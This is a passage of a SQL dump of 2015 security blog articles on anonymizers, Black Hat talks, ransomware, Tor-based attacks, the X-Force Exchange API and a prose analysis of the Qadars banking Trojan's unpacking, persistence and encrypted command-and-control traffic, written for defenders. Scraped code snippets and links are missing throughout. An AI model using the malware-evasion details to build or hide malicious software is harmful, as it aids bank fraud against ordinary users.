'https://securityintelligence.com/the-top-ways-cybercriminals-infiltrate-retailers-systems-and-steal-customer-data/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (382, 'HORNET: Anonymity May Come at a Price — Likely in Hard Cash!', 'Limor Kessem', '2015-7-30', 'is the promise of high-speed, 93 Gbps, encrypted, anonymized browsing. Remind you of Tor? It’s not so far off from The Onion Router, and it even relies on the same core concepts that Tor’s inventors implemented. In terms of the anonymizers available nowadays, Tor is by far the most popular free option, lending Internet users the ability to keep their identities and communications concealed from prying eyes. Obviously, Tor is also very popular among cybercriminals and their circles, the most infamous of all being Silk Road, an online marketplace for illegal drugs and services that was operated as a Tor hidden service. Hidden service means that connections are only accepted from other Tor nodes, essentially keeping the communication even more private. In May 2015, Silk Road was exposed, and its founder, Ross Ulbricht, was sentenced to life in prison for his role in running it. But Silk Road was neither the first nor last of its kind, and it’s definitely not the only one out there. Cybercriminals are avid users of Tor because it lends them the ability to conceal their misdoings from law enforcement agencies, security researchers and hostile peers. One thing that cybercriminals aim to do and find challenging is the routing of real-time criminal activity through an anonymizer. This would allow them to commit their crimes under a cloak of anonymity with the sort of obfuscation that would effectively hide their whereabouts and the sourcing of fraudulent wire transfers or other illicit online transactions. The biggest hindrance? Tor and similar services such as I2P are simply too slow! The encryption-decryption schemes that take place inside these large networks slow things down quite a bit on the Internet, and this latency is what keeps cybercriminals from being able to abuse anonymizers in an even larger variety of illegitimate activities than they already do. Now HORNET has entered the anonymizing arena. A new player that’s still not publicly available, HORNET was developed on the same ideas that gave rise to Tor, conceptualized by five scientists from Zurich- and London-based universities. What this team has created is the basis for a new anonymizing network that is much like Tor, only more secure and, supposedly, much, much faster. While the current   mostly consists of Tor and I2P nodes that are being used for anonymizing Internet traffic, content and sources, HORNET promises to deliver “Internet-scale anonymous communication.” Are you wondering what “more secure” would mean within this context? Well, it means more private. The founders claim it will have double the encryption that Tor has and run much more quickly. Just like Tor, HORNET encrypts encapsulated network requests, with each layer being decrypted by the nodes passing the traffic along to the next one, along with instructions on the data’s route and destination. Unlike Tor, HORNET uses two different onion protocols for protecting the anonymity of requests to the open Internet. It also features a modified version of Tor’s public rendezvous point (RP) scheme for communications carried out in the hidden service mode. As for the main feature that sets HORNET apart — speed — the researchers have measured speeds of 93 Gbps when they tested HORNET between their universities in Switzerland and the U.K. Behind this high-speed anonymizing power, HORNET’s founders indicate it uses source-selected paths and shared keys between routers to support the anonymity of communications. This means that while data is not encrypted as often as it is inside the Tor network, it still remains highly anonymized. And since there are less encryption-decryption occurrences, the entire delivery is faster and much closer to real time. This is indeed exciting news, and many people who care about their privacy are going to be much happier about being able to use faster Internet at last. Think about activists, people who live under oppressing regimes, journalists in foreign countries, whistleblowers and your average next door neighbor who just wishes to keep his business away from dragnet surveillance or third-party monitoring — they could all benefit from such a service. HORNET, like other anonymizers before it, is an inherently legitimate network. What we should be thinking about at the same time is that security and integrity have to be built into it right from the get-go rather than bolted on as an afterthought. If I could name one factor that helps cybercriminals feel more comfortable committing online crimes, it is by far the ability to remain unknown. It’s no wonder anonymizing tools and techniques are and always have been an important part of how criminals handle themselves online. It’s also easy to understand that if   in that regard, then a faster, double-encrypted version of it will be twice as interesting to cybercriminals, offering them that x factor they have been hoping for: an anonymizer fast enough for real-time online fraud. Nowadays, when cybercriminals attack online banking customers with banking Trojans, they can use their own devices, which is when they opt to go with some sort of anonymizer. In those cases, they must initiate the login and transaction from a node that conceals their true IP address and the data it exchanged with the bank. But what cybercriminals shy away from is using anonymizers in scenarios where the fraud requires real-time interaction with victims, such as via webinjections and when they must use a one-time, time-based password. The latency of anonymized browsing prevents the criminal from leveraging it efficiently, and they have to come up with other creative means to keep their true IP hidden, usually by proxying their activity through the victim’s own machine. Another thing fraudsters would like to do but avoid   for is remote access to their victims’ machines using a RAT, VNC or poisoned TeamViewer malware. Here, too, adding more sluggishness to the already slower operation is not a preferred route. The inevitable question is will HORNET solve these latency issues so well that it unintentionally enables criminals by removing barriers? Will it allow criminals to abuse HORNET’s capabilities for their real-time fraud scenarios, affording them higher speed and added privacy they did not have with Tor, I2P and the like? Do anonymizers really hide criminals? The short reply is yes. But, like many things in life, it depends. The longer reply is that, just like anything,   in a variety of ways, which can strip its users of the anonymity they enjoy inside the network. If you’re thinking the government also surveils anonymizing networks, then you’d be correct. Law enforcement   at the origin of certain types of activity in order to prosecute them for their crimes. Some have claimed that it’s also possible to be   after just expressing interest in anonymizing networks. The anonymizers we know today are not 100 percent bulletproof in the sense that they do not fully conceal everyone from everything. Here, too, another question arises: In those cases where criminals are hiding via anonymizing services or public safety is at risk, will law enforcement be able to decrypt the doubled obfuscation that HORNET will implement? Or when terrorists use these networks to conceal their nefarious activity, will a stronger and speedier anonymizer not hinder national security? And while not as critical in terms of human lives, will it mean that cybercriminals will be safe inside HORNET and make banks and everyday users pay for privacy with their hard-earned cash? So far, HORNET is still in testing and is not a fully public network scaled to millions of users. Not even the founders of HORNET know how it will behave once the number of users grows considerably. Yes, the current protocol might be capable of 93 Gbps, but once the network is up, the speed is also subject to exit nodes and internal hosts. The main issue with Tor being notoriously slow is that the exit nodes are swamped with connections and bandwidth is starved. Whether HORNET has a true fix for this problem remains to be seen. One thing is certain, however: HORNET will be very popular in its initial phases because that’s when it will be at its fastest. The questions I bring to you are part of my thoughts on the matter, from the cybercrime prevention and   points of view. I think we should be asking these questions as soon as new technology advances emerge for the sake of preparation and intelligent response, not after we see the first organization hit. At this point, the recommended action is to keep an eye out for what’s to come and also to examine internally how your organization detects and communicates with anonymizer nodes. Then, keeping in mind that your indicators may see a change once HORNET goes into the next phase, define the ways your organization will recognize connections with such nodes and treat the communications they source. This is applicable to any and all organizations, but it carries more immediate implications for service providers that must accurately identify online users, especially those that rely on IP addresses and HTTP referrers. Financial services, online wallets, online gaming, government and military resources are especially risk-averse in this case. They should use adapted security solutions that can identify connections from anonymizer nodes and properly alert security teams when the risk of access or transactions rises.', '\'Cybercrime\', \'Cybersecurity\', \'Risk Assessment\', \'Threat Intelligence\', \'Tor\'', 'https://securityintelligence.com/hornet-anonymity-may-come-at-a-price-likely-in-hard-cash/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (383, 'Black Hat Shows Off More Advanced Threats', 'Doug Franklin', '2015-7-27', 'The information security industry descends on Las Vegas each summer to attend the U.S. installment of the  . Black Hat consists of both vendor training sessions and briefings. The schedule of both has long been expansive enough to prevent individuals from seeing everything they find interesting. As the scope of advanced threats grows, the amount of material to cover at Black Hat grows along with it. Here is a quick look at the briefings and themes that look interesting to me. The Black Hat USA website contains a   for you to explore. Right off the bat, two specific presentations specifically caught my eye because their juxtaposition reminded me of the old MTV show “Celebrity Death Match.” If you don’t remember it, the show presented claymation versions of well-known celebrities fighting in a boxing ring to the gory death, with clay and folding chairs flying everywhere. While it may not be on TV anymore, a few Black Hat briefings present competing ideas that could lead to a similar-style smackdown. First, I saw Haroon Meer and Marco Slaviero’s “Bring Back the Honeypots,” which argues that honeypots can still be useful InfoSec tools but that they have to change to fit current demands. A moment later, I encountered “Breaking Honeypots for Fun and Profit  by Dean Sysman, Gadi Evron and Itamar Sher. They discuss common implementation weaknesses in honeypots and ways to leverage those weaknesses to not just bypass the honeypot without detection, but to actually leverage the systems in the honeypot to the attacker’s advantage. I next noticed that researchers have apparently been dogging the Border Gateway Protocol (BGP) to find new attack methods. In “Internet Plumbing for Security Professionals: The State of BGP Security,” Wim Remes surveys the current BGP security posture and common countermeasures for defenders. Dan Hubbard and Andree Toonk will also present “BGP Stream” to discuss the monitoring of the BGP system and methods to identify nefarious activities within the noise of legitimate updates to the route tables. At the  , they will introduce their BGP Stream platform to aggregate notices of potentially malicious routing changes. Further illustrating the potential for mischief, Artyom Gavrichenkov brings you “Breaking HTTPS With BGP Hijacking.” This briefing discusses the modern reality of BGP hijacking and how it can be accomplished, subverting the HTTPS infrastructure along the way. Another area of research focus involves advanced threats using firmware and hardware to sabotage system security. In “Attacking Hypervisors using Firmware and Hardware,” Yuriy Bulygin, Alexander Matrosov, Mikhail Gorobets and Oleksandr Bazhaniuk explore ways to attack virtual machine hypervisors through the hardware and firmware of the host computer and the hardware emulation of the hypervisor. They present new attacks on hypervisors using system firmware vulnerabilities with a variety of troubling outcomes. Intersecting with Industrial Control Systems (ICSS) and the Internet of Things (IoT), researchers Johannes Klick, Stephan Lau, Daniel Marzin, Jan-Ole Malchow and Volker Roth use their presentation “Internet-Facing PLCs — A New Back Orifice” to examine attacks on and with Programmable Logic Controllers (PLCs) and other components of ICSs. They cover novel tools and techniques to exploit PLCs as a pathway into industrial control system networks and demonstrate attacks using the tools. Focusing closer to home for many attendees, in “The Memory Sinkhole — Unleashing an x86 Design Flaw Allowing Universal Privilege Escalation,  Christopher Domas explores life above Ring 0 in the x86 processors’ protection model and demonstrates a proof-of-concept exploit to escalate privileges into that all-powerful but little-understood realm. After last year’s rash of advanced threats to infrastructure components like OpenSSL, concern grew across the industry regarding vulnerabilities in components outside the system developer’s control. Those threats included the Heartbleed, Shellshock, POODLE and FREAK vulnerabilities and more. Jake Kouns presents “Stranger Danger! What is the Risk from 3rd Party Libraries?” to examine and analyze these sorts of infrastructure risks and share case studies of companies mitigating risks. Looking at a specific case directly impacting cryptography, Ralf-Philipp Weinmann presents “Assessing and Exploiting BigNum Vulnerabilities.” In the title, BigNum refers to a library that implements arithmetic for integers larger than typical processors can represent, like the 2,048-bit (and larger) keys used in some forms of public key cryptography.   in the BigNum library could spell trouble for multiple implementations of common cryptographic operations. It also appears that the industry may finally be trying better to come to grips with the riskiest participants in any secured system: the people. In “How Vulnerable Are We to Scams?” Markus Jakobsson and Ting-Fang Yen relate their own experiments on scam messages’ ability to penetrate automated protection systems such as spam filters, as well as the likelihood that a recipient of such a message will consider it harmless. In “Automated Human Vulnerability Scanning with AVA,” Laura Bell addresses protecting those people from their own gullibility. Bell describes the existing situation and then introduces AVA, billed as “the first automated human vulnerability scanner,” to aid in security risk and countermeasures assessments. In a related vein, “Hidden Risks of Biometric Identifiers and How to Avoid Them” by Thomas Keenan gives a survey of state-of-the-art biometric technologies paired with a framework for evaluating their efficacy on a variety of fronts, from reliability to abuse potential to creepiness. I want to give a quick shout out to my   Advanced Research colleague  , who will present “Understanding the Attack Surface and Attack Resilience of Project Spartan’s New EdgeHTML Rendering Engine.” Mark will cover the attack surface EdgeHTML presents and discuss the exploit mitigations included in EdgeHTML and applicability of known bypass techniques. As you can see from this quick overview, this year’s   covers a broad scope of topics, and it’s almost impossible to do justice to the selection. On my first pass through the list of briefings, I found about 40 that I want to attend and had to whittle the list down severely to fit both the scope of this article and my ability to actually attend them during the conference. With so many exciting possibilities, Black Hat USA 2015 promises to be even busier and more informative than previous incarnations.', '\'Advanced Threats\', \'Black Hat\', \'Black Hat USA\', \'Security Conferences\'', 'https://securityintelligence.com/black-hat-shows-off-more-advanced-threats/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (384, 'An Analysis of the Qadars Banking Trojan', 'Igor Aronov', '2015-7-23', 'I recently noticed a   discussing the Qadars banking Trojan, and at the time, it had a very low detection rate (4/56) on the VT (virustotal.com) SHA1 : 563379a48d876f6c35317bb7551efeb55754123056109ab030d1e796ae1b9c2c. I decided it would be a decent candidate for a deeper technical look, and I divided my analysis into three logical parts: This stage consist of two distinct parts. Both are used to protect the main malware module from detection. The malware performs the following steps to achieve this: Additional details about the first part of Stage 1 (exception handler): This blob of data is treated as an array. The array after transformation becomes the new code section and control is passed to it. The steps taken by the malware to transform array into the valid code are simple bit swaps based on the key generated offset calculations. The algorithm is shown below: For example, the first two characters to be swapped. Memory before swap: Memory after swap: Jumps to the newly created code section: Additional details about part two of Stage 1 (in the newly created code section): To find a blob of data, the malware uses a technique similar to the “egg hunt” technique used in the shellcode. First, it calculated the following data: The content of the main malware module is copied into a buffer allocated on the heap. The first 8 bytes are the marker that the malware is searching for in the executable. This is the so-called “egg,” and it is found at offset 0xE511 in the executable on the disk. The scanning is performed from the end to the beginning of the file. Once the marker is found, the malware calculates the size of the encrypted blob of data. In order to do this, it takes 4 bytes immediately following the “egg” and XORs it with the data at offset +0x08 in the blob of data shown above. Next, 8 bytes in the file and in the blob of data above (offset +0x0C) are used to calculate the initial XOR key that is used to decrypt the blob of data. The encrypted data in the file starts at offset 0xE525; the size of the blob of data is 0xC76A. The following function is used to decrypt the blob of data: Next, the decrypted blob of data is decompressed. The stack before the call to RtlDecompressBuffer: An additional detail is that the malware collects data about the machine and creates an interesting structure. For example, on the test machine, the malware creates the following structure: An MD5 hash for the above structure is calculated and stored locally. ASCII and UNICODE strings representing formatted MD5 hashes are created. For example, on the test machine: Both MD5 hashes are concatenated with the computer name (‘#’ is used as a separator). An MD5 hash of this data is calculated. This data becomes the unique GUID that is used by the malware. The malware uses the same algorithm, as it always produces the same result, but the result would be unique per infected system. Next, the malware creates a randomly named path within “%AppData%” and copies itself into the randomly named executable file located in that directory. For example, on the test system, the malware created a copy of itself located at: “%AppData%\\MfzxAHCb\\HQHKWbsv\\PMqLMKtj\\oPQVNiRgs.exe” An MD5 hash of the newly created copy of the malware is calculated and stored along with the word BOTNET2: The malware creates a scheduled task that would run on the current user’s next login. This is achieved by performing the following sequence of calls: Creates the registry keys “HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{[unique_per_system_guid]}”. Populates subkeys “@” , “0” and “1”. The data in the registry is encrypted using AES. The registry is used to pass data to the next stage. The AES key is derived from the hard-coded data: The derived key is: The algorithm for key derivation is: Next, the malware runs a copy of itself located in the “%AppData%” directory: This stage creates a payload for the initial C&C request and sends it. Details of the payload creation and malware logic for Stage 3 follow. The malware calculates computer-specific data (as described in Stage 2) and compares the result to the data stored in “KEY_CURRENT_USER\\Software\\Classes\\CLSID\\{[computer_unique_guid]}”. If equal, the malware proceeds to the next stage. Data stored in the registry “HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{[computer_unique_guid]}\\0” is enumerated. For example, on the test machine, the size of the data is 0x170, and the encrypted data stored in the registry is: The decrypted data is: Next, the data is tokenized: The same operation is performed on the data stored in “HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{[computer_unique_guid]}\\1”. An interesting structure containing pointers to the domain names and common request page are stored in the local array-like structure: Next, the following interesting function is called: The first thing the malware does within this function is create a payload for the C&C request. For example, on the test machine, the first part of the plaintext payload (length 0x123) is: The data has the following format: “string” + data + 1-character separator. For example, “pszBotID” (string) + “x0I-C957A26036A04#972958A65880B55A0EBD5559078C1735” (data) + “k” (separator; changes for other entries). The malware generates a pseudorandom 9-byte character string and appends it to the data above: An additional, 9-byte-long, pseudorandom string is generated: An MD5 hash of the string is calculated: The above blob of data is encrypted using AES. The MD5 hash of the second pseudorandom string is used as the key: The following data is generated based on the hard-coded data used to generate the initial AES key for encrypting data in the registry: This data is concatenated with the AES encrypted buffer: This buffer is then base64-encoded: The base64-encoded buffer is checked for the presence of “+” and “=” characters. These characters are replaced with “%2B” and “%3D”, respectively. The malware creates an additional 7-byte-long pseudorandom string: This string is then prepended to the base64-encoded buffer: This data becomes the content of the request sent to the C&C by the malware. Shown below is the sequence of WinINet APIs used by the malware in order to establish communication with the C&C: The malware creates a structure containing all request-related information: Sample request: The first stage was successful in hiding the main malware module from the antivirus engines at the time it first appeared in the wild. But Stage 1 fails to hide the main module at present as antivirus signatures. Encrypted communication creates difficulties for the dynamic analysis since it makes it hard to understand the payload creation. Persistence mechanisms employed by the malware (scheduling a task at the next login) is uncommon.', '\'Advanced Threats\', \'Banking Trojan\', \'IBM X-Force Research\', \'Qadars Trojan\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/an-analysis-of-the-qadars-trojan/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (385, 'Ransomware: The Enterprise’s Boogeyman', 'Michelle Alvarez', '2015-7-21', 'Thanks to the boogeyman, I’m afraid of the dark. He hid in my closet and under my bed when I was younger. Not sure what he wanted, but as a (insert grain of salt here) grown-up in this cyberthreat-saturated world, I still see him. He comes in different forms now, though. Sometimes he’s an SQL injection wanting data or a denial-of-service attack wanting network disruption; and sometimes he’s ransomware, wanting bitcoins. Ransomware is malware that encrypts files and deletes the originals, thereby making access impossible unless a ransom is paid. It also may lock the whole system and then sell the user the password needed to unlock it. Usually the ransom is paid by going to a website devised by the attacker that asks the victim to enter a unique key. Only after paying the ransom, often via   or other electronic currency, will the user be given the password to unlock the files. Eight out of 10 security leaders surveyed in the   see the challenge posed by external threats rising to include not only financial and intellectual property theft but also ransomware. That’s because successful ransomware such as CryptoLocker and CryptoWall is now costing organizations millions globally. In fact,   in terms of infection rate. Its malware and infrastructure may not be as sophisticated as CryptoLocker’s, but it’s undeniably one of the most destructive ransomware families circulating today. The most recent version, CryptoWall 3.0, uses the Tor anonymity network for command-and-control (C&C) communications and is especially aggressive. Infections for CryptoWall 3.0 are on the rise. As if we didn’t have enough to deal with, most cyberthreats make their way over to the mobile arena. Pletor, the first dedicated mobile malware, began circulating in May of last year. Soon there were multiple families of mobile ransomware — ScarePakage, ScareMeNot, ColdBrother and Koler, among others — with a huge impact. According to the  , ScareMeNot and ScarePakage were among the top five most prevalent mobile threats in countries such as the U.S., U.K. and Germany. How does someone become a victim of ransomware? Spam and   are tried-and-true attack tools and are often used to deliver ransomware. The email message contains a malicious attachment or a link to a malicious file. Once activated, the ransomware may impose a time limit for payment. This malware can also be delivered by exploit kits on compromised Web pages and malicious sites. When a user visits a compromised site serving exploit kit code, the code tries to identify potential vulnerabilities on the user’s system and serves exploits accordingly. Drive-by downloads provide another infection vector. Once the ransom note appears, organizations face the difficult decision of striking a deal with the criminals or not. Many organizations place a higher importance on recovering their valuable data. In one recent  , 30 percent of security professionals were willing to negotiate. Among organizations already victimized by cybercriminals, that figure rose to 55 percent. Don’t go setting up an incidental expense account filled with bitcoins just yet — all is not lost. Ransomware is certainly on the rise, but organizations that implement the security recommendations like those suggested in the IBM research report “ ” will be better prepared to protect their critical assets from the threat. Fortunately, companies can take steps to detect and stop ransomware, chiefly by implementing an   and keeping patches up to date. A regularly updated backup is always essential and is absolutely critical should first-line defenses fail.', '\'Bitcoin\', \'CryptoLocker\', \'CryptoWall\', \'Malware\', \'Ransomware\', \'Threat Intelligence\'', 'https://securityintelligence.com/ransomware-the-enterprises-boogeyman/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (386, 'What Surfaces From the Deep, Dark Web', 'John Kuhn', '2015-7-17', 'The terms Deep Web, Dark Web and darknet have begun piercing the bubble of popular culture. They’re used continuously in shows like CBS’ “CSI: Cyber” and “ ” on the USA Network. While not quite as popular as terms like malware, give them some time and they’ll get there eventually. The Deep Web is typically referenced as a place where criminals meet and sell various illegal wares first and foremost. It is, however, also a place from which cybercriminals issue attacks. One very popular platform used on the   is Tor, originally known as The Onion Router. As its name suggests, it is a layered platform built to facilitate privacy in online activity. Tor is one of the most popular anonymizing platforms on the Internet. Each peer or node that is part of Tor adds a layer of obfuscation to traffic and content, like an onion, protecting them from exposure to unintended eyes. Once the traffic arrives at a destination, it has to be de-obfuscated to a legible form, thereby exiting the network via an exit node. Exit nodes are the connection from the Tor network to the surface Web, or the publicly accessible Internet. These nodes translate the anonymous, peer-to-peer traffic streamed between Tor nodes on the Deep Web, allowing it to reach websites on the surface Web. My latest report, “ ,” focuses on this aspect of the Deep Web. What exactly are criminals using Tor and its exit nodes for? Are some criminals hiding behind Tor to issue attacks against corporations? The answer to that is yes, they are. This answer is arrived at through an understanding of the exit nodes themselves, where they are placed and what their proxying capabilities are. An exit   has a legitimate purpose: It masks the IP of the original senders, allowing them to conduct their Web surfing with some degree of anonymity. Unsurprisingly, this is what some criminals use Tor for — to disguise their attacks’ content and origins. The chart below, based on   data, shows a steady increase in malicious attacks from Tor, suggesting that more and more adversaries are hiding behind the program to execute attacks. What’s also interesting are the sudden peaks of traffic. We have evidence that these peaks are tied to malicious botnets that reside within Tor.   The report also takes a closer look at the most commonly used attacks. There are some interesting patterns emerging, from SQL injection and distributed denial-of-service (DDoS) botnets to malicious vulnerability scanning.', '\'Cybercrime\', \'Dark Web\', \'Darknet\', \'Deep Web\', \'Tor\'', 'https://securityintelligence.com/what-surfaces-from-the-deep-dark-web/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (387, 'A Gentle Introduction to the X-Force Exchange API', 'Doug Franklin', '2015-7-17', 'IBM Security recently introduced the   threat intelligence sharing portal. This facility opens the vast trove of current and historical threat information that the IBM Security X-Force has collected since the 1990s. X-Force Exchange offers a wide variety of information, including everything from the detailed vulnerability information provided on the   page to the IP address, domain and URL reputation information from the   portal. The portal provides a Web User Interface and a secure, RESTful, JSON-based application programming interface (API). This API allows clients to automate querying X-Force Exchange and to integrate with their systems and requirements. The APIs fall into three rough categories: This article focuses on the public queries that clients can invoke with an anonymous authentication token. A blog article doesn’t have room to cover all of them in detail, so we’ll provide an overview of a few. On the lower left of the X-Force home page lies a  . This page identifies the queries and options and the data model for the JSON results. It even allows you to interactively run the queries, showing an equivalent curl command, the request URL and the response body. This offers quick query testing before enshrining them in an application. As with many Web-based applications, X-Force Exchange omits response fields that have no value in the database. Clients must pay attention to the   and   tabs on the documentation page to ensure they have all the necessary fields, and they must be prepared for certain values not to exist in some responses. You can get more detailed help using the   tag in  . Excluding authorization and the   interface, the public APIs fall into seven basic categories, each providing current data and some offering historical data. The /resolve/ query retrieves DNS information for domain names, URLs and IP addresses. It returns a JSON object that represents common DNS record types. The report accounts for both current (live) and historical information for the domain, including the results of passive DNS monitoring by the IBM Security sensor network. The /app/ queries return information on Internet Application Profiles (IAPs) for services such as Facebook, NFL.com and Instagram, among the reputable. Of course, the database includes many less-than-reputable applications, as well, and it offers risk assessments and categorization for each. Three queries allow clients to enumerate the IAPs, conduct full-text search for applications and retrieve the application specifics. Three /ipr/ queries retrieve IP address, geolocation, risk ratings and content categorization for IP addresses and subnets. These include malware samples associated with the IP address, if any. One query retrieves the reputation report for an IP address, another retrieves the reputation history and the third retrieves records of associated malware. The two /malware/ queries retrieve details on malware identified by name, family or MD5 hash. The results include details of domain names and IP addresses associated with the malware, as well as its detected origins. For example, malware detected attached to spam or phishing emails reports the subject of the emails in addition to the origin IP address and purported origin domain. A pair of /signatures/ queries retrieves details of security signatures implemented in   products. One query allows full-text search of the signature definitions, while the other allows clients to retrieve signature details. The /url/ queries retrieve URL risk ratings, content categories and malware information, complementing the IP address and domain queries. One retrieves the reputation and history of a URL, while the other retrieves information related to malware associated with the URL. The vulnerability information in X-Force Exchange is the aspect most likely to seem familiar to users of the X-Force database. X-Force Exchange and the API provide access to all the public vulnerability information amassed by X-Force since the 1990s. The vulnerability records provide not just details on a vulnerability, but also offer links to relevant online documents and CVSS scoring with component breakdown. New vulnerabilities entered into the system now receive CVSS V3 scores with breakdown, the only source using CVSS V3 at the moment. Four queries give access to this data: The queries offering full-text searching contain   in their query paths. They allow you to perform case-insensitive searches for specific strings, optionally with single- and multiple-character wild cards (the ? and * characters, respectively). They also support more powerful search syntax using the   query specification. The search language: For example, the search phrase: will search for reports including the word   and also either the word stems   or  , but specifies that results matching the   stem are twice as important. The API applies the search to all database fields that contain natural text, such as descriptions and titles. The   documentation at the   provides details on the search language syntax. You should pay particular attention to the   section of that document. In addition, the you must properly encode the search phrase so that it can form part of a valid URL. The full-text search queries return a maximum of 200 items, so you may have to add search terms to narrow results. Though X-Force Exchange has only existed for a short time, open-source client projects popped up very quickly on  . If you use the same language as one of these, you can avoid doing some of the interface work. Note that none of these represent official IBM projects, nor does IBM endorse any of them. The Golang library seems to cover the largest subset of the API, with the Python project a close runner-up. The R project focuses on analyzing and graphing risk scores for IAPs. However, those fundamentals provide plenty of examples for extending it to cover more of the API. This rest of this article covers some of the nuts and bolts of interacting with the  , in case you implement your own interface. The examples use ECMAScript (JavaScript) since Python and Go are covered above. We present only snippets and examples rather than production code. In that vein, the examples use the HTTPS and JSON modules directly, rather than a richer framework. Since   queries operate asynchronously, the call generally returns before the client receives a response. The examples encapsulate this operation in a function called  . The caller passes in the full path for the query, including any parameters, all nicely escaped to be legal as URL components. The caller also passes the name of a function to process the JSON results. The   function uses a global variable called   as a template of the access parameters for  . The HTTPS module expects those parameters to be delivered as a dictionary: The   platform serves the X-Force Exchange API from the   host over HTTPS (port 443). The queries use HTTP GET requests, and the API presents JSON-formatted results. The function makes a copy of the   template and sets the query path using the path string argument. Then it invokes   to actually make the request and receive the response, using callbacks to process errors, additional data and completion. Upon completion, the function dissects the response with the JSON parser and passes the results to the caller-supplied function. The   function: Similar to many network APIs, the X-Force Exchange API omits empty response values to conserve bandwidth. That means that you must take care to ensure that individual response values actually exist before trying to manipulate them. You must acquire an anonymous authorization token before any public API queries will succeed. The public API queries (except /auth/anonymousToken) require a valid authorization token in each request’s headers. To retrieve the authorization token, make a request to the /auth/anonymousToken API. The full URL for the request: If the request succeeds, it returns a JSON object containing a single   object, which contains a really long string. After receiving the response, you must extract the authorization token value and stash it away for use in subsequent queries. Each public API query must include the value “Bearer ” (note the space) followed by the token string as the value of its Authorization header. The   function expects that the processing function saved an appropriate header in the   structure: These authorization tokens persist for three days. You can periodically revitalize existing tokens with the /refresh query or request a completely new token with the /auth/anonymousToken query. You can also use the token until queries return error 401 (Not Authorized) and refresh or replace the token at that time. With the token — or header, as it were — in hand, the public API opens for your business. In the discussion below, space constraints prevent full listings of the JSON results of these queries. You can use the interactive query capability of the   to see the full scope of the results. One of the simplest X-Force Exchange API queries retrieves current DNS data about a fully qualified domain name (FQDN), an IP address or a URL. The results provide additional value over actual DNS queries by integrating information accrued passively by the IBM Security sensor network in addition to the information that the DNS system provides in a live query. The request itself uses a simple syntax, and the results mirror those of common DNS queries. The query takes the form: where you replace   with the target of the query. For example, to retrieve information on the   FQDN, you compose the query: We pick on this domain because it returns interesting results, as you will see below. The JSON result contains components reflective of DNS record types. In particular, it contains IPv4 and IPv6 address information, text records and mail exchange (MX) information. The JSON object represents these values as objects named after their DNS record type, when they are present. For example, only some domains can resolve to IPv6 addresses, so only some domains return   objects. The response potentially contains objects named   and   to represent the similarly named DNS records. Each holds an array of strings expressing the values. The response may also contain an object named   to supply mail exchange information. The   object contains an array of objects, one for each mail exchange. Each of those objects contains fields named   and  , which supply the name of mail exchange server and its priority, just as a DNS MX query would. At the time of writing this article, the example domain returned the following: I mentioned interesting results earlier, and this is when things get interesting. Retrieving information about malware associated with a URL or domain uses a query as simple as the previous one, but it produces more complex results. The syntax of the query: As before, replace   with   to produce the query: These results might surprise the network operations team at Schneider Electric! When writing this article, the query returned five malware samples associated with this domain, all detected between May 7, 2015, and May 26, 2015. Apparently, during the month of May, some enterprising spammers forged the domain name on spam email. The query returns a single JSON object named  , containing an array of one object for each malware sample associated with the domain. Each object contains several fields that describe the malware instance and its association with the domain. The evidence for address forgery comes mainly by checking the IP addresses from which the spam messages were sent. Obviously any email could forge any sender address regardless of the actual sender. The five samples originated from four different IPv4 addresses: 24.243.102.12, 24.173.27.194, 78.10.106.142 (two different samples) and 105.237.120.134. If they really originated with Schneider Electric, five samples probably would not originate from four different IPv4 addresses in widely scattered subnets. Further, checking those IP addresses, we find that exactly none of them have any apparent affiliation with the company or its domain name. Finally, let’s look at a query with very complex results: the malware query. This API takes the MD5 hash of a malware sample and produces a report of the instances and the context in which the IBM Security sensor network detected it. The query looks like: Using the first MD5 returned in the previous query, we get the request: Now you see what I mean by complex. The response JSON data contains a single object named  , and it looks pretty simple at first. Then you notice that it contains a variety of objects that contain other objects, etc. The simple objects in the   object identify high-level attributes of the malware sample: The remaining response objects contain other objects. The   array provides the names of malware families in which X-Force Exchange categorizes the sample. For each family name, the   object contains a count of the number of samples of that family detected by the sensor network. The entries in the   array take the name of the family and contain an attribute   giving the count for that family. For example: Finally, the   object contains four objects, each of them complex and possibly empty. The   array contains details of email messages in which the sensor network detected the malware, and the objects in the   array describe the subject lines of those email messages. The   array contains objects giving details related to command-and-control (C&C) servers associated with the malware. Finally, the   array contains objects giving details of servers from which clients downloaded the malware. Each of these four objects contains two objects:   identifies the number of objects, and   contains one object for each server. The objects in each   array have different fields, determined by which of the four objects (emails, subjects, CnCServers or downloadServers) contains them. This article barely scrapes the surface of the X-Force Exchange API capabilities. As previously mentioned, the   provides the details of all available queries, describes their results and lets you interactively test them. Though X-Force Exchange only rolled out a few months ago, it continues to grow both in the scope of the data it hosts and the requests it supports. As the query capabilities expand, the API help page will document the additions.', '\'Application Programming Interface (API)\', \'IBM X-Force Exchange\', \'Information Sharing\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/a-gentle-introduction-to-the-x-force-exchange-api/');
